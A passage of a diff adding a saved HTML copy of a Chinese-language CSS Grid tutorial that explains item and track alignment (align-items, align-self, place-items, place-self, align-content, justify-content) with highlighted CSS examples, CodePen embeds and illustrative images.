+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-items</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--align-items, auto)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/XWRzpWp(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/XWRzpWp">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p><code>align-items</code>取不同值时，网格项目在块轴方向的对齐方式如下：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-281.jpg" alt=""></p>
+
+<p>正如上图所示，<code>align-items</code> 指定的也是网格项目在所在网格区域块轴方向的对齐方式（默认就是网格项目所在的网格单元格区域），如果使用<code>grid-template-areas</code>定义网格区域，并且使用<code>grid-area</code>指定了网格项目在已定义的网格区域中，那么<code>align-items</code>会指网格项目在这个网格区域的块轴的对齐方式：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value">
+        <span class="string"><span class="string">"content content"</span></span>
+        <span class="string"><span class="string">"content content"</span></span>;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-items</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--align-items, auto)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> content;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/mdmqRMg(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/mdmqRMg">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>效果如下：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-282.jpg" alt=""></p>
+
+<p><code>align-items</code> 相当于为网格的所有网格项目都设置了<code>align-self</code>属性，也可以在单独的网格项目使用<code>align-self</code>指定其在块方向列轴的对齐方式。比如下面这个示例，第一个网格项目<code>align-self</code>的值采用默认值<code>stretch</code>、第二个网格项目<code>align-self</code>的值为<code>start</code>、第三个网格项目的<code>align-self</code>为<code>end</code>，第四个网格项目的<code>align-self</code>的值为<code>center</code>：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">8</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value">
+        <span class="string"><span class="string">"a a a a b b b b"</span></span>
+        <span class="string"><span class="string">"a a a a b b b b"</span></span>
+        <span class="string"><span class="string">"c c c c d d d d"</span></span>
+        <span class="string"><span class="string">"c c c c d d d d"</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> a;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> b;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> start;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> c;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> end;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(4)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> d;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="align-self" src="./Grid布局：12-网格布局中的对齐方式和间距_files/OJmOWaV(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/OJmOWaV">
+  align-self</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-283.jpg" alt=""></p>
+
+<p>你可能已经发现了，如果我们在网格容器上同时设置<code>justify-items</code> 和 <code>align-items</code> 的值为<code>center</code>时，网格容器中的所有网格项目都会在所在网格区域中水平垂直居中：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">2</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-items</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-items</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/LYyOWxK(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/LYyOWxK">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<video controls="" width="100%" style="width: 100%; aspect-ratio: 16 / 9;" poster="/sites/default/files/blogs/2021/2107/css-grid-284.jpg">
+    <source src="/sites/default/files/blogs/2021/2107/css-grid-284.mp4" type="video/mp4">
+</video>
+</div>
+
+<p>但是，要是在某个网格项目上显式设置了<code>justify-self</code> 或 <code>align-self</code> 的值为非<code>center</code>时，即使在网格容器上显式设置了<code>justify-items</code>和<code>align-items</code>值为<code>center</code>，也不能让网格项目在网格区域中水平垂直居中。比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__items</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> start;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__items</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> end;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__items</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> stretch;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__items</span></span><span class="pseudo"><span class="pseudo">:nth-child(4)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> stretch;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-285.jpg" alt=""></p>
+
+<p>CSS 网格布局中的 <code>justify-items</code> 和 <code>align-items</code> 可以使用它们的简写属性 <code>place-items</code> 来替代，其第一个值是<code>align-items</code>，第二个值是<code>justify-items</code>。即：</p>
+
+<pre class="javascript"><code class="javascript">place-items: <span class="xml"><span class="tag"><span class="xml"><span class="tag">&lt;<span class="title"><span class="title">align-items</span></span>&gt;</span></span></span><span class="xml"> <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">justify-items</span></span>&gt;</span></span>
+</span></span></code></pre>
+
+<p>如果第二个值省略不写，则<code>justify-items</code>和<code>align-items</code>的值相同。比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">place-items</span></span></span><span class="rule">:<span class="value"><span class="value"> center start;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="rule">// 等同于
+    <span class="attribute"><span class="attribute">align-items</span></span>:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-items</span></span></span><span class="rule">:<span class="value"><span class="value"> start;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">place-items</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="rule">// 等同于
+    <span class="attribute"><span class="attribute">align-items</span></span>:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-items</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p>在一些文章中，你可以看到，有很多说在 CSS 网格布局中，仅两行代码就可以让网格项目水平垂直居中：</p>
+
+<pre class="cs"><code class="cs">.grid {
+    display: grid; <span class="comment"><span class="comment">// 或 inline-grid</span></span>
+    place-items: center;
+}
+</code></pre>
+
+<p>严格上讲，这两行代码会让网格容器中的所有网格项目在所占网格区域中水平垂直居中，但有一条件，网格项目<code>align-self</code>和<code>justify-self</code> 未显式设置非<code>center</code>的。</p>
+
+<p>换句话说，如果你只希望让网格容器中某个网格项目在所占网格区域中水平垂直居中的话，则可以在该网格项目中设置<code>align-self</code>和<code>justify-self</code>的值为<code>center</code>：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">4</span></span>, <span class="number"><span class="number">1</span></span>fr)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-auto-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">200</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value">
+        <span class="string"><span class="string">". a a ."</span></span>
+        <span class="string"><span class="string">". a a ."</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> a;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-self</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/abWVWwN(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/abWVWwN">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>网格项目<code>i1</code>在网格区域<code>a</code>中水平垂直居中：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-286.jpg" alt=""></p>
+
+<p><code>place-self</code> 和 <code>place-content</code> 类似，不同的是<code>place-self</code> 是 <code>align-self</code> 和 <code>justify-self</code> 的简写属性：</p>
+
+<pre class="javascript"><code class="javascript">place-self: <span class="xml"><span class="tag"><span class="xml"><span class="tag">&lt;<span class="title"><span class="title">align-self</span></span>&gt;</span></span></span><span class="xml"> <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">justify-self</span></span>&gt;</span></span>
+</span></span></code></pre>
+
+<p>如果 <code>place-self</code> 的第二个值省力不写的话，则和第一个值相同。比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">place-self</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="rule">// 等同于
+    <span class="attribute"><span class="attribute">align-self</span></span>:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">justify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> center;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">place-self</span></span></span><span class="rule">:<span class="value"><span class="value"> start center;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="rule">// 等同于
+    <span class="attribute"><span class="attribute">align-self</span></span>:<span class="value"><span class="value"> start;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">jutify-self</span></span></span><span class="rule">:<span class="value"><span class="value"> center
+}</span></span></span><span class="value"></span></span></span><span class="rule"><span class="value"></span></span></span>
+</code></pre>
+
+<h4 class="content-title" data-index="4">网格轨道的对齐</h4>
+
+<p>有的时候，网格中所有网格轨道尺寸所占据的空间小于网格容器，那么就可以在网格容器中对齐网格轨道。针对块方向的列轴和文本方向的行轴，分别使用<code>align-content</code>对齐到块方向的列轴，使用<code>justify-content</code>对齐到文本方向的行轴。</p>
+
+<p><code>align-content</code>和<code>justify-content</code>属性可选的值有：</p>
+
+<ul>
+<li><code>normal</code></li>
+<li><code>start</code></li>
+<li><code>end</code></li>
+<li><code>center</code></li>
+<li><code>stretch</code></li>
+<li><code>space-around</code></li>
+<li><code>space-between</code></li>
+<li><code>space-evenly</code></li>
+<li><code>baseline</code></li>
+<li><code>first baseline</code></li>
+<li><code>last baseline</code></li>
+</ul>
+
+<p>假设我们有一个网格容器，该网格容器的宽高都是<code>500px</code>，分别定义了行轨道和列轨道各三条，轨道的尺寸<code>100px</code>，网格轨道之间的间距是<code>10px</code>：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span>  <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>,<span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">height</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">500</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">500</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-287.jpg" alt=""></p>
+
+<p>正如上图所示，网格容器的块方向的列轴和文本方向的行轴都有剩余空间<code>200px</code>（<code>500 - 300</code>）。</p>
+
+<p>先在网格容器上设置<code>align-content</code>：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="680" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/MWmrqwo(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/MWmrqwo">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>调整<code>algin-content</code>的值，将看到的效果如下：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-288.jpg" alt=""></p>
+
+<p>在上面示例上稍加调整，加上<code>grid-template-areas</code>，并且让每个网格项目在指定的网格区域中：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value">
+        <span class="string"><span class="string">"a a b"</span></span>
+        <span class="string"><span class="string">"a a b"</span></span>
+        <span class="string"><span class="string">"c d d"</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">height</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">500</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">500</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">10</span></span>px;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">--align-content</span></span></span><span class="rule">:<span class="value"><span class="value"> start;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">align-content</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">var(--align-content)</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(1)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> a;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(2)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> b;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(3)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> c;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__item</span></span><span class="pseudo"><span class="pseudo">:nth-child(4)</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> d;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="680" style="width: 100%;" scrolling="no" title="" src="./Grid布局：12-网格布局中的对齐方式和间距_files/xxdpaMe(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/xxdpaMe">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p><code>align-content</code>取不同值效果如下：</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-289.jpg" alt=""></p>
+
+<p>你可能已经发现了，这些与分配空间有关的值会使网格项目变大。如果网格项目跨越了多于一条网格轨道，因为轨道的间隙变大了，所以网格项目也变得更大了。因为精确尺寸的网格较为常用，所以如果你决定使用这些值，一琮要确保其中的内容能够适应多出来的空间，或者在使用这些属性值时，把项目的对齐设置为对齐到起点（<code>start</code>），可能会比设置为拉伸（<code>stretch</code>）更好。</p>
+
+<p>就拿示例中的<code>align-content</code>取值为 <code>start</code> 和 <code>space-between</code>来作对比吧。其中网格项目<code>i1</code>和网格项目<code>i2</code>，它们都跨越了两条行轨道，右侧的图因为增加了轨道间距，所以它们占据的空间变大了。</p>
+
+<p><img src="./Grid布局：12-网格布局中的对齐方式和间距_files/css-grid-290.jpg" alt=""></p>
+
+<p><code>justify-content</code>和<code>align-content</code>类似，不同的只是设置网格轨道在网格容器文本方向的行轴对齐方式。比如：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">repeat(<span class="number"><span class="number">3</span></span>, <span class="number"><span class="number">100</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">height</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">500</span></span>px;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">500</span></span>px;</span></span></span><span class="value"></span></span>
